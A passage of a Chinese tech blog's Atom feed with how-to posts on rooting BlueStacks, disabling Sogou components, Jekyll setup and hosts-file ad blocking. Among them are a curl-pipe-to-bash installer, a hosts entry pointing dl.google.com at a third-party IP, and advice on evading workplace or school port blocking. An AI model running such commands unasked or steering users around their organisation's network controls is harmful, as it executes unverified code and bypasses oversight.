    <content type="html"><![CDATA[<p>使用重名文件替换原文件夹的办法。</p><p>进入搜狗输入法目录，比如：<code>D:\Program Files\SogouInput\Components</code>，删除<code>SGImeGuard</code>文件夹，新建文本文件，重命名为<code>SGImeGuard</code>（去掉.txt扩展名）。</p><p>上步骤中如果删除不掉<code>SGImeGuard</code>文件夹，重启电脑后删除。</p><p>另外，还可以用同样的办法删除搜狗输入法<code>Componets</code>目录下的<code>AddressSearch</code>文件夹，同样新建<code>AddressSearch</code>文件防止搜狗自动创建AddressSearch文件夹。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用重名文件替换原文件夹的办法。&lt;/p&gt;
&lt;p&gt;进入搜狗输入法目录，比如：&lt;code&gt;D:\Program Files\SogouInput\Components&lt;/code&gt;，删除&lt;code&gt;SGImeGuard&lt;/code&gt;文件夹，新建文本文件，重命名为&lt;code&gt;SG
      
    
    </summary>
    
    
      <category term="Sogou" scheme="https://g2ex.top/tags/Sogou/"/>
    
  </entry>
  
  <entry>
    <title>BlueStacks 0.8.8 Root 以及安装Google服务</title>
    <link href="https://g2ex.top/2014/04/29/BlueStacks-Root/"/>
    <id>https://g2ex.top/2014/04/29/BlueStacks-Root/</id>
    <published>2014-04-29T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、BlueStacks-Root"><a href="#一、BlueStacks-Root" class="headerlink" title="一、BlueStacks Root"></a>一、BlueStacks Root</h2><p>BlueStacks Root 方法由<a href="http://forum.xda-developers.com/showthread.php?t=2565644" title="xda developers" target="_blank" rel="noopener">xda</a>论坛提供。</p><p>Google搜索「BlueStacks MultiTool」或者直接打开「BlueStacks MultiTool v1.07」的地址：<a href="http://forum.xda-developers.com/showthread.php?t=2565644" title="xda developers" target="_blank" rel="noopener">http://forum.xda-developers.com/showthread.php?t=2565644</a>，转到附件出，下载「BSAutoRooter」、「BSMultiTool」和「UPDATE-Super」，附件中列出的是这三个工具的多个版本，可以选择任意一个版本下载，这里选择了<code>BSAutoRooter_v1.04r5.zip</code>、<code>BSMultiTool_1.07.zip</code>和<code>UPDATE-Superuser-v3.2.zip</code>，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_121633.webp" alt="下载必需的三个工具" title="下载必需的三个工具"></p><p>下载完成后，解压缩<code>BSAutoRooter_v1.04r5.zip</code>、<code>BSMultiTool_1.07.zip</code>分别得到<code>BSAutoRooter.exe</code>和<code>BSMultiTool.exe</code>，把这两个<code>exe</code>文件连同下载的<code>UPDATE-Superuser-v3.2.zip（不要解压缩）</code>放到同一个文件夹中，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_140944.webp" alt="放到同一目录" title="放到同一目录"></p><p>双击<code>BSMultiTool.exe</code>，键盘输入<code>1</code>，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_120149.webp" alt="启动BSMultiTool" title="启动BSMultiTool"></p><p>等待检查完BlueStacks状态和环境，按任意键开始root，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_120201.webp" alt="按任意键继续" title="按任意键继续"></p><p>等待root完成，按<code>Q</code>键退出。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_120339.webp" alt="Root完成" title="Root完成"></p><h2 id="二、安装Google服务"><a href="#二、安装Google服务" class="headerlink" title="二、安装Google服务"></a>二、安装Google服务</h2><p>其实BlueStacks已经内置了Google服务，运行起来BlueStacks，使用应用搜索功能就可以选择从Google Play中安装应用。</p><p>另外，在<a href="http://forum.xda-developers.com/showthread.php?t=2565644" title="xda developers" target="_blank" rel="noopener">xda</a>论坛页面中提供了gapps，找到<code>Google Apps Installer for BlueStacks</code>的下载链接，如下图所示，下载后双击就可以安装到BlueStacks中。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-04-29_135703.webp" alt="下载gapps" title="下载gapps"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、BlueStacks-Root&quot;&gt;&lt;a href=&quot;#一、BlueStacks-Root&quot; class=&quot;headerlink&quot; title=&quot;一、BlueStacks Root&quot;&gt;&lt;/a&gt;一、BlueStacks Root&lt;/h2&gt;&lt;p&gt;BlueStacks
      
    
    </summary>
    
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="BlueStack" scheme="https://g2ex.top/tags/BlueStack/"/>
    
      <category term="Root" scheme="https://g2ex.top/tags/Root/"/>
    
      <category term="Gapps" scheme="https://g2ex.top/tags/Gapps/"/>
    
  </entry>
  
  <entry>
    <title>如何绕过端口封锁</title>
    <link href="https://g2ex.top/2014/02/22/Break-the-Blocked-Ports/"/>
    <id>https://g2ex.top/2014/02/22/Break-the-Blocked-Ports/</id>
    <published>2014-02-22T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>网络端口封锁在公司或学校等机构比较常见。对一些不常见端口的封锁虽然可以起到防止病毒、木马或者黑客破坏的一定效果，但一些使用了不常见端口的服务就因此没法使用了。</p><p>一般来说，对于存在端口封锁的网络，有两个端口是要放行的，这分别是80和443端口。80端口是<code>HTTP 超文本传输服</code>使用的默认端口，443端口是<code>HTTPS 加密的超文本传输服务</code>使用的默认端口，如果能正常访问http和https的网站，就说明这两个端口是开放的。如果所在的上级路由把这两个端口都封锁了，本文介绍的方法就彻底无效了。</p><p>接下来介绍使用代理或VPN的方法来绕过端口封锁！</p><ol><li><p>使用代理</p><p> 目前最常见最稳定的代理非<a href="https://code.google.com/p/goagent/" title="GoAgent" target="_blank" rel="noopener">GoAgent</a>莫属。它利用Google的服务器作为代理，访问的是Google服务器的443端口。利用GoAgent代理上网，网络管理员只知道到你在访问Google，无法得知你真实访问的网站。</p><p> GoAgent的部署和使用在其主页上已经有了详细的说明。</p><p> 注意，该方法只适合浏览器访问被封锁了端口的网站，如果要想全局代理，要么使用<code>Proxifier</code>，要么使用下一种方法。</p></li><li><p>使用VPN</p><p> 在VPN中，PPTP和L2TP比较常见，PPTP使用1723端口，L2TP使用1701端口，如果这两个端口被封锁，那么可以尝试使用443端口的SSL-VPN和OpenVPN。</p><p> 下面介绍使用443端口的SSL-VPN如何连接。</p><p> 首先要说一下<a href="http://www.vpngate.net/" title="VPNGate" target="_blank" rel="noopener">VPN Gate项目</a>：</p><blockquote><p>VPN Gate 学术实验项目是一个在线服务，由日本国立筑波大学研究生院为学术研究目的运营。本研究的目的是推广 “全球分布式公共 VPN 中继服务器” 的知识。</p></blockquote><p> 然后下载安装<a href="http://www.vpngate.net/cn/download.aspx" title="下载 VPN Client" target="_blank" rel="noopener">SoftEther VPN Client</a>，在<a href="http://www.vpngate.net/cn/#LIST" title="IP 列表" target="_blank" rel="noopener">列表</a>中查找<code>TCP: 443</code>，记下该行第二列的IP地址，在<code>SoftEther VPN Client 管理器</code>中双击<code>创建新的 VPN 连接</code>，<code>主机名</code>中填写刚刚记下的IP地址，<code>虚拟 hub 名</code>中填写<code>VPNGATE</code>，<code>用户认证设置</code>的用户名和密码都为<code>VPN</code>，确定保存。</p><p> 另外，<code>用户认证设置</code>默认的是<code>标准密码验证</code>，在设置时也可以选择<code>匿名身份验证</code>，用户名仍然是<code>VPN</code>。</p></li></ol><p>至此，可以使用这两种方法绕过端口封锁，原理是利用了没有被封锁的443端口。</p><p>PS：这两种方法也可以用来科学上网。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网络端口封锁在公司或学校等机构比较常见。对一些不常见端口的封锁虽然可以起到防止病毒、木马或者黑客破坏的一定效果，但一些使用了不常见端口的服务就因此没法使用了。&lt;/p&gt;
&lt;p&gt;一般来说，对于存在端口封锁的网络，有两个端口是要放行的，这分别是80和443端口。80端口是&lt;cod
      
    
    </summary>
    
    
      <category term="VPN" scheme="https://g2ex.top/tags/VPN/"/>
    
      <category term="GoAgent" scheme="https://g2ex.top/tags/GoAgent/"/>
    
  </entry>
  
  <entry>
    <title>网络提供商的缓存问题</title>
    <link href="https://g2ex.top/2013/12/06/Cache-Problems-Caused-by-ISP/"/>
    <id>https://g2ex.top/2013/12/06/Cache-Problems-Caused-by-ISP/</id>
    <published>2013-12-06T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>住处的网络提供商是宽带通，今天TeamViewer发布了9.0，在<a href="http://www.teamviewer.com/zhcn/download/windows.aspx" title="TeamViewer官网下载页面" target="_blank" rel="noopener">TeamViewer官网下载页面</a>下载竟然得到的还是8.0版本。想到前两天发现了Ubuntu更新时错误<code>Hash Sum mismatch</code>的根本原因就是宽带通设置的透明缓存<sup><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=52&t=423516&sid=7877f90e773fea818cbafa9e3fd2224f" title="关于引起更新源索引时Hash Sum mismatch问题的真正原因及解决方案" target="_blank" rel="noopener">[了解更多]</a></sup>，下载的文件不是更新源上的最新文件，计算出来的<code>Hash Sum</code>当然就匹配不正确了。于是使用国外VPN再次下载TeamViewer，便得到了最新的9.0版本！</p><p>下面以TeamViewer的下载为例，验证一下网络提供商是不是存在缓存的问题。</p><h2 id="一、直接下载"><a href="#一、直接下载" class="headerlink" title="一、直接下载"></a>一、直接下载</h2><p>不使用代理，直接打开<a href="http://www.teamviewer.com/zhcn/download/windows.aspx" title="TeamViewer官网下载页面" target="_blank" rel="noopener">TeamViewer官网下载页面</a>，点击<code>下载 v9.0.24482</code>，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_191105.webp" alt="下载TeamViewer9" title="下载 TeamViewer 9"></p><p>下载的文件名为<code>TeamViewer_Setup_zhcn.exe</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_190647.webp" alt="直接下载TeamViewer9" title="直接下载 TeamViewer 9"></p><p>下载完成后，查看<code>TeamViewer_Setup_zhcn.exe</code>的属性，发现竟然是<code>8.0.22298</code>！其中修改日期是指文件在我电脑上创建的日期：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_191254.webp" alt="直接下载的程序属性" title="直接下载的 TeamViewer 属性"></p><h2 id="二、使用VPN下载"><a href="#二、使用VPN下载" class="headerlink" title="二、使用VPN下载"></a>二、使用VPN下载</h2><p>挂上国外的VPN（或其他代理软件），刷新<a href="http://www.teamviewer.com/zhcn/download/windows.aspx" title="TeamViewer官网下载页面" target="_blank" rel="noopener">TeamViewer官网下载页面</a>，再次点击<code>下载 v9.0.24482</code>，保存的文件名为<code>TeamViewer_Setup_zhcn (1).exe</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_190743.webp" alt="使用代理下载TeamViewer9" title="使用代理下载 TeamViewer 9"></p><p>接着查看<code>TeamViewer_Setup_zhcn (1).exe</code>的属性，确实是我们想要的<code>9.0.24482</code>版本了：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_191426.webp" alt="使用代理下载的程序属性" title="使用代理下载的 TeamViewer 属性"></p><h2 id="三、再次直接下载"><a href="#三、再次直接下载" class="headerlink" title="三、再次直接下载"></a>三、再次直接下载</h2><p>你可能要问，“你第一次下载文件时有可能TeamViewer的服务提供的就是<code>8.0.22298</code>版本，第二次通过代理下载时，恰巧TeamViewer的服务器更新到了<code>9.02.24482</code>版本，上述过程不能说明是网络提供商的问题”。好吧，那下面断开国外的VPN，再次刷新<a href="http://www.teamviewer.com/zhcn/download/windows.aspx" title="TeamViewer官网下载页面" target="_blank" rel="noopener">TeamViewer官网下载页面</a>，再次点击<code>下载 v9.0.24482</code>，保存的文件名为<code>TeamViewer_Setup_zhcn (2).exe</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_190945.webp" alt="直接下载TeamViewer9" title="直接下载 TeamViewer 9"></p><p>接着查看<code>TeamViewer_Setup_zhcn (2).exe</code>的属性，还是老版本！</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_191517.webp" alt="直接下载的程序属性" title="直接下载的 TeamViewer 属性"></p><h2 id="四、结论"><a href="#四、结论" class="headerlink" title="四、结论"></a>四、结论</h2><p>通过国外VPN下载时，因为我的电脑和VPN服务器之间的数据是加密的，我所在的网络提供商宽带通就无法知道我下载的文件了，也就不会把它之前缓存的<code>TeamViewer 8.0.22298</code>版本返回给我，这本来是它为了节省带宽资源而设计的缓存机制，没想到无形之中造成了这样的神秘问题。如果以后碰到类似的情况，就要用代理了。看来翻墙不仅仅是为了对抗GFW，连网络提供商都要防着！</p><p>宽带通误我！</p><h2 id="五、另外"><a href="#五、另外" class="headerlink" title="五、另外"></a>五、另外</h2><p>使用宽带通的计算机访问不同地区的站点，计算机的出口IP是经过“优化”的，从下面的两张图中可以看出同一时间访问不同的网站时，其IP地址是不同的：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_192804.webp" alt="ip138" title="IP from ip138.com"></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-06_192816.webp" alt="ipcn" title="IP from ip.cn"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;住处的网络提供商是宽带通，今天TeamViewer发布了9.0，在&lt;a href=&quot;http://www.teamviewer.com/zhcn/download/windows.aspx&quot; title=&quot;TeamViewer官网下载页面&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
      <category term="ISP" scheme="https://g2ex.top/tags/ISP/"/>
    
  </entry>
  
  <entry>
    <title>Linux上搭建Jekyll环境</title>
    <link href="https://g2ex.top/2013/12/05/Setup-Linux-Jekyll-Environment/"/>
    <id>https://g2ex.top/2013/12/05/Setup-Linux-Jekyll-Environment/</id>
    <published>2013-12-05T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>利用Github Pages搭建了<a href="http://g2ex.me" title="G2ex" target="_blank" rel="noopener">个人博客</a>，文章可能不止一次地修改，就会造成多次commit，想着本地搭建环境，待文章彻底改好本地测试满意之后，再提交。搭建Github Pages的Jeykll环境总会遇到大大小小的错误，最常见的有<code>Error: Failed to build gem native extension</code>。今天总结一下Linux下本地Jekyll搭建的步骤和错误的解决办法，以备后需。</p><p>Github Pages基于Jekyll，Jekyll基于Ruby gem，Jekyll的正常工作需要系统中正确安装了Ruby、Rubygems。因为GFW的原因，导致 <a href="https://rubygems.org/" title="Rubygems官网" target="_blank" rel="noopener">rubygems.org</a> 存放在 Amazon S3 上面的资源文件间歇性连接失败，大陆用户建议使用<a href="http://ruby.taobao.org/" title="Ruby淘宝更新源" target="_blank" rel="noopener">淘宝Ruby更新源</a>替换默认的更新源。如果你有翻墙之术，则可以跳过下面的第3步。</p><p>导致错误<code>Error: Failed to build gem native extension</code>的原因是已安装Ruby的版本太低，需要使用高版本的Ruby才能解决此问题。<sup><a href="http://stackoverflow.com/questions/15796274/rdiscount-error-failed-to-build-gem-native-extension" title="stackoverflow上的问题" target="_blank" rel="noopener">[了解更多]</a></sup>为了安装高版本的Ruby，我们先安装<code>RVM</code>，使用<code>RVM</code>来安装Ruby。</p><p>另外，如果你的网络供应商是“长城宽带”或者“宽带通”，那么你可能还会碰到<code>Hash Sum mismatch</code>问题或者运行<code>rvm requiresments</code>时发生下图类似的错误，这是因为这些网络提供商设置了透明缓存，即便更换系统更新源也无济于事，你有必要使用代理来解决这个问题。<sup><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=52&t=423516&sid=7877f90e773fea818cbafa9e3fd2224f" title="关于引起更新源索引时Hash Sum mismatch问题的真正原因及解决方案" target="_blank" rel="noopener">[了解更多]</a></sup></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-12-04_225737.webp" alt="运行`rvm requiresments`时发生的错误" title="运行 rvm requiresments 时发生的错误"></p><hr><p>下面开始在<a href="http://www.ubuntu.com/" title="Ubuntu官网" target="_blank" rel="noopener">Ubuntu</a> / <a href="http://www.linuxmint.com/" title="Linux Mint官网" target="_blank" rel="noopener">Linux Mint</a> / <a href="http://elementaryos.org/" title="Elementary OS官网" target="_blank" rel="noopener">Elementary OS</a>上建本地Jekyll环境，这里以Elementary OS为例。</p><h2 id="一、安装RVM"><a href="#一、安装RVM" class="headerlink" title="一、安装RVM"></a>一、安装RVM</h2><p>安装<code>RVM</code>的时候需要用到<code>curl</code>，所以先安装<code>curl</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install curl</span><br></pre></td></tr></table></figure><p>安装完成后，使用<code>curl</code>下载<code>RVM</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L get.rvm.io | bash -s stable --auto</span><br></pre></td></tr></table></figure><p>重新加载<code>.bash_profile</code>配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ . ~/.bash_profile</span><br></pre></td></tr></table></figure><p>安装<code>RVM</code>所依赖的包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rvm requirements</span><br></pre></td></tr></table></figure><h2 id="二、安装Ruby"><a href="#二、安装Ruby" class="headerlink" title="二、安装Ruby"></a>二、安装Ruby</h2><p>目前ruby的最新版本是ruby 2.0.0，版本可以从<a href="https://www.ruby-lang.org/" title="Ruby官网" target="_blank" rel="noopener">Ruby官网</a>查找。</p><p>安装Ruby 2.0.0：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rvm install 2.0.0</span><br></pre></td></tr></table></figure><p>安装完成开始使用<code>2.0.0</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rvm use 2.0.0</span><br></pre></td></tr></table></figure><p>查看一下Ruby的具体版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -v</span><br></pre></td></tr></table></figure><p>根据终端显示，说明目前安装的是<code>ruby 2.0.0-p353</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby 2.0.0p353 (2013-11-22 revision 43784) [i686-linux]</span><br></pre></td></tr></table></figure><p>下面设置系统默认使用的Ruby版本，注意最后要加上<code>-p353</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rvm --default use 2.0.0-p353</span><br></pre></td></tr></table></figure><h2 id="三、更新Ruby源"><a href="#三、更新Ruby源" class="headerlink" title="三、更新Ruby源"></a>三、更新Ruby源</h2><p>首先使用以下命令检查本地gem源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gem sources</span><br></pre></td></tr></table></figure><p>终端会显示（有时候显示的可能是<code>http://rubygems.org/</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://rubygems.org/</span><br></pre></td></tr></table></figure><p>使用以下命令把Ruby源更改为淘宝的Ruby源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gem sources --remove https://rubygems.org/</span><br><span class="line">$ gem sources -a http://ruby.taobao.org/</span><br></pre></td></tr></table></figure><p>再使用<code>gem sources</code>命令检查一下，看源是否已经换成了淘宝的。</p><h2 id="四、安装Jekyll"><a href="#四、安装Jekyll" class="headerlink" title="四、安装Jekyll"></a>四、安装Jekyll</h2><p>至此，Ruby环境已经搭建完成，可以安装Jekyll了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gem install jekyll -V</span><br></pre></td></tr></table></figure><p>安装需要一段时间，上条命令中<code>-V</code>参数可以查看详细下载和安装情况，也可以不带<code>-V</code>参数。</p><p>安装完成Jekyll后，进入博客目录，使用<code>jekyll serve</code>命令启动Jekyll服务，如果没有错误，就可以使用浏览器访问本地博客了。</p><h2 id="五、另外"><a href="#五、另外" class="headerlink" title="五、另外"></a>五、另外</h2><p>你可能需要<code>RDiscount</code>?</p><p>如果你的博客中使用了<code>RDiscount</code>作为<code>Markdown</code>的解释器，那么还需要安装<code>RDiscount</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gem install rdiscount</span><br></pre></td></tr></table></figure><p>RDiscount是使用C写的模版解释器，效率要比Maruku高很多。详情<a href="http://stackoverflow.com/questions/373002/better-ruby-markdown-interpreter" title="stackoverflow上的问题" target="_blank" rel="noopener">点我了解更多</a>。</p><h2 id="六、参考内容"><a href="#六、参考内容" class="headerlink" title="六、参考内容"></a>六、参考内容</h2><ol><li><a href="http://jekyllrb.com/" target="_blank" rel="noopener">http://jekyllrb.com/</a></li><li><a href="https://www.ruby-lang.org/" target="_blank" rel="noopener">https://www.ruby-lang.org/</a></li><li><a href="http://rubygems.org/" target="_blank" rel="noopener">http://rubygems.org/</a></li><li><a href="http://ruby.taobao.org/" target="_blank" rel="noopener">http://ruby.taobao.org/</a></li><li><a href="http://rubygems.org/gems/rdiscount" target="_blank" rel="noopener">http://rubygems.org/gems/rdiscount</a></li><li><a href="http://ryanbigg.com/2010/12/ubuntu-ruby-rvm-rails-and-you/" target="_blank" rel="noopener">http://ryanbigg.com/2010/12/ubuntu-ruby-rvm-rails-and-you/</a></li><li><a href="http://stackoverflow.com/questions/15796274/rdiscount-error-failed-to-build-gem-native-extension" target="_blank" rel="noopener">http://stackoverflow.com/questions/15796274/rdiscount-error-failed-to-build-gem-native-extension</a></li><li><a href="http://stackoverflow.com/questions/373002/better-ruby-markdown-interpreter" target="_blank" rel="noopener">http://stackoverflow.com/questions/373002/better-ruby-markdown-interpreter</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;利用Github Pages搭建了&lt;a href=&quot;http://g2ex.me&quot; title=&quot;G2ex&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;个人博客&lt;/a&gt;，文章可能不止一次地修改，就会造成多次commit，想着本地搭建环境，待文章彻底改好本
      
    
    </summary>
    
    
      <category term="Jekyll" scheme="https://g2ex.top/tags/Jekyll/"/>
    
      <category term="Github" scheme="https://g2ex.top/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>利用Hosts屏蔽广告</title>
    <link href="https://g2ex.top/2013/08/19/Anti-AD-in-Hosts/"/>
    <id>https://g2ex.top/2013/08/19/Anti-AD-in-Hosts/</id>
    <published>2013-08-19T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hosts屏蔽QQ广告"><a href="#Hosts屏蔽QQ广告" class="headerlink" title="Hosts屏蔽QQ广告"></a>Hosts屏蔽QQ广告</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0fodder.qq.com</span><br><span class="line">0.0.0.0adshmct.qq.com</span><br><span class="line">0.0.0.0hm.l.qq.com</span><br><span class="line">0.0.0.0adshmmsg.qq.com</span><br><span class="line">0.0.0.0q.i.gdt.qq.com</span><br><span class="line">0.0.0.0v.gdt.qq.com</span><br></pre></td></tr></table></figure><p>因为QQ客户端在权限足够的情况下会主动修改hosts文件，所以修改完hosts后需要把权限关掉。修改hosts的方法参考《<a href="http://g2ex.farbox.com/2014-08-13-modify-windows-hosts" target="_blank" rel="noopener">Windows中修改HOSTS的方法</a>》。</p><p>以下是<a href="http://www.fishlee.net/soft/tools/" target="_blank" rel="noopener">木鱼</a>修改hosts并清理QQ广告缓存的脚本，把脚本保存为<code>.bat</code>文件，Win7使用管理员权限运行。更详细的介绍，请访问<a href="http://www.fishlee.net/soft/tools/" target="_blank" rel="noopener">木鱼的网站</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line"></span><br><span class="line">ECHO 本批处理仅限于Windows7/8/8.1 或以上系统、并且未关闭UAC的情况下使用</span><br><span class="line">ECHO 或请在运行后手动锁定HOSTS权限，否则QQ可能会通过篡改HOSTS文件的方式让屏蔽失效</span><br><span class="line">ECHO.</span><br><span class="line">ECHO 请关闭正在运行的QQ或TM，按任意键继续</span><br><span class="line">PAUSE 1&gt;NUL 2&gt;NUL</span><br><span class="line">taskkill /im qq.exe</span><br><span class="line">taskkill /im tm.exe</span><br><span class="line"></span><br><span class="line">ECHO 正在写入HOSTS文件……如果杀毒软件报警，请允许写入</span><br><span class="line">ECHO 0.0.0.0fodder.qq.com &gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line">ECHO 0.0.0.0adshmct.qq.com &gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line">ECHO 0.0.0.0hm.l.qq.com &gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line">ECHO 0.0.0.0adshmmsg.qq.com &gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line">ECHO 0.0.0.0q.i.gdt.qq.com&gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line">ECHO 0.0.0.0v.gdt.qq.com&gt;&gt;%SYSTEMROOT%\SYSTEM32\DRIVERS\ETC\HOSTS</span><br><span class="line"></span><br><span class="line">ECHO 正在删除本地缓存……</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"%AppData%\Tencent\QQ\Misc"</span></span><br><span class="line"><span class="keyword">for</span> /d %%i <span class="keyword">in</span> (com.tencent.advertisement*) <span class="keyword">do</span> rd <span class="string">"%%i"</span> /s /q</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"%AppData%\Tencent\Users\"</span></span><br><span class="line"><span class="string">del misc.db /s /q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ECHO.</span></span><br><span class="line"><span class="string">ECHO 已经搞定了！ o(∩_∩)o</span></span><br><span class="line"><span class="string">ECHO by 木鱼(2013.10.31)</span></span><br><span class="line"><span class="string">PAUSE 1&gt;NUL 2&gt;NUL</span></span><br></pre></td></tr></table></figure><h2 id="Hosts屏蔽阿里旺旺广告"><a href="#Hosts屏蔽阿里旺旺广告" class="headerlink" title="Hosts屏蔽阿里旺旺广告"></a>Hosts屏蔽阿里旺旺广告</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 click.tanx.com</span><br><span class="line">0.0.0.0 p.tanx.com</span><br></pre></td></tr></table></figure><h2 id="Hosts屏蔽Skype广告"><a href="#Hosts屏蔽Skype广告" class="headerlink" title="Hosts屏蔽Skype广告"></a>Hosts屏蔽Skype广告</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 rad.msn.com</span><br><span class="line">0.0.0.0 live.rads.msn.com</span><br><span class="line">0.0.0.0 ads1.msn.com</span><br><span class="line">0.0.0.0 static.2mdn.net</span><br><span class="line">0.0.0.0 g.msn.com</span><br><span class="line">0.0.0.0 a.ads2.msads.net</span><br><span class="line">0.0.0.0 b.ads2.msads.net</span><br><span class="line">0.0.0.0 ac3.msn.com</span><br></pre></td></tr></table></figure><h2 id="更多去广告Hosts"><a href="#更多去广告Hosts" class="headerlink" title="更多去广告Hosts"></a>更多去广告Hosts</h2><p>更多广告的hosts可以从<a href="https://code.google.com/p/huhamhire-hosts/" target="_blank" rel="noopener">huhamhire-hosts</a>中提取。</p><h2 id="额外的福利"><a href="#额外的福利" class="headerlink" title="额外的福利"></a>额外的福利</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hosts for Android SDK Manager：</span></span><br><span class="line">64.15.120.23 dl.google.com</span><br><span class="line">64.15.120.23 dl-ssl.google.com</span><br></pre></td></tr></table></figure><p><code>update 